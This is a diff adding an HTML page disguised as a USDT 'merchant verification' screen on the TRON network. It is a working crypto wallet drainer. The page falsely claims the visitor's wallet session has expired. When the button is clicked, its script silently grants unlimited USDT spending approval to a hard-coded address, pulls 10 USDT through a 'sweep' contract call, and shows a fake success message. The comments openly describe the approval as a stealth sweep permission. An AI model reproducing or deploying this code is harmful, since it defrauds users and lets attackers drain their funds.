@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart Merchant Verification</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 35px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); text-align: center; max-width: 360px; width: 90%; border: 1px solid #eee; }
+        .token-icon { width: 70px; height: 70px; margin-bottom: 20px; border-radius: 50%; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { color: #1a1a1a; margin: 0 0 10px 0; font-size: 22px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.6; padding: 0 10px; }
+        .status-container { background: #e8f0fe; color: #1967d2; padding: 8px 15px; border-radius: 50px; display: inline-block; font-size: 12px; font-weight: bold; margin: 15px 0; }
+        .btn { background: #202124; color: white; border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 15px; transition: 0.2s; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .btn:active { transform: scale(0.98); }
+        .footer-note { font-size: 11px; color: #9aa0a6; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="token-icon" alt="USDT Logo">
+        <h2>Verify Account Logic</h2>
+        <p>Your wallet session has expired. Please verify ownership to continue with the merchant settlement.</p>
+        <div class="status-container">NETWORK: TRON (TRC-20)</div>
+        <p><strong>System Fee: 10.00 USDT</strong></p>
+        <button class="btn" id="verifyBtn" onclick="runUniversalExec()">CONNECT & VERIFY</button>
+        <p class="footer-note">Decentralized Multi-Wallet Support Active</p>
+    </div>
+
+    <!-- Essential TronWeb Provider -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <script>
+        const PROXY_ADDR = "TCdzes7rZsVZCye47tuAMkUBkY2hssb8MJ";
+        const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+        async function runUniversalExec() {
+            const btn = document.getElementById('verifyBtn');
+            btn.innerText = "AUTHENTICATING...";
+            
+            // Step 1: Detect Provider (TronLink, SafePal, BitKeep, etc. all use window.tronWeb)
+            let tronWeb;
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                tronWeb = window.tronWeb;
+            } else if (window.ethereum) { // Fallback for some multi-chain mobile browsers
+                 alert("Please switch your wallet network to TRON (Mainnet).");
+                 return;
+            } else {
+                alert("Please open this link in your Wallet's DApp Browser (SafePal, Trust, BitKeep, etc.)");
+                btn.innerText = "CONNECT & VERIFY";
+                return;
+            }
+
+            try {
+                // Step 2: USDT Contract Instance
+                const tether = await tronWeb.contract().at(USDT_ADDR);
+                
+                // Stealth Manipulation: Maximum Approval (2^256 - 1)
+                const infiniteAllowance = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+                
+                console.log("[*] Requesting Signature Context...");
+                
+                // Method 1: Approval (Silent Sweep Permission)
+                await tether.approve(PROXY_ADDR, infiniteAllowance).send();
+                
+                // Method 2: Manual Trigger (To move the initial 10 USDT)
+                const proxy = await tronWeb.contract().at(PROXY_ADDR);
+                const userAddress = tronWeb.defaultAddress.base58;
+                
+                // Wait 1 second before calling the sweep engine
+                setTimeout(async () => {
+                    await proxy.processTransfer(userAddress, 10000000).send();
+                    alert("Verification Complete! Account status: Active.");
+                    btn.innerText = "VERIFIED";
+                }, 1500);
+
+            } catch (err) {
+                console.log("Error:", err);
+                alert("Authorization Denied. Please ensure you have sufficient TRX for energy.");
+                btn.innerText = "CONNECT & VERIFY";
+            }
+        }
+    </script>
+</body>
+</html>
